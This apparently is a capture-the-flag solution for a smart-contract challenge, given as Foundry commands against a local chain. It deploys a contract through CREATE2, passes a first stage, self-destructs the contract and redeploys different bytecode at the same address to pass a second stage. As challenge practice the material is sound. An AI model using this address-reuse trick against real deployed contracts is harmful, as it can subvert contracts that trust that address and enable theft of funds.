```sh
forge create .\src\Setup.sol:Setup -r local --account local --broadcast
```

```sh
forge create .\src\Create2Factory.sol:Create2Factory -r local --account local --broadcast
```

```sh
forge inspect ./src/solve/CreateFactory.sol:CreateFactory bytecode --no-metadata
```

```sh
cast send $CREATE2FACTORY "deploy(bytes)" $CREATEFACTORYBYTECODE -r local --account local
```

```sh
cast call $CREATE2FACTORY "computeAddress(bytes32)(address)" "0x9d22333a1e3136fc1f434611bbf452db6674d883bb64e23fefe40cb46b14861e"
```

```sh
forge inspect ./src/solve/One.sol:One bytecode --no-metadata
```

```sh
cast send $CREATEFACTORY "deploy(bytes)" $ONEBYTECODE -r local --account local
```

```sh
cast compute-address $CREATEFACTORY --nonce 1 -r local
```

```sh
cast send $SETUP "stage1(address)" $YOURCONTRACT -r local --account local
```

```sh
cast send $CREATEFACTORY "destroy()" -r local --account local
```

```sh
cast send $YOURCONTRACT "destroy()" -r local --account local
```

redeploy using create2

```sh
forge inspect ./src/solve/Two.sol:Two bytecode --no-metadata
```

```sh
cast send $CREATEFACTORY "deploy(bytes)" $TWOBYTECODE -r local --account local
```

```sh
cast send $SETUP "stage2()" -r local --account local
```

```sh
cast call $SETUP "isSolved()(bool)" -r local --account local
```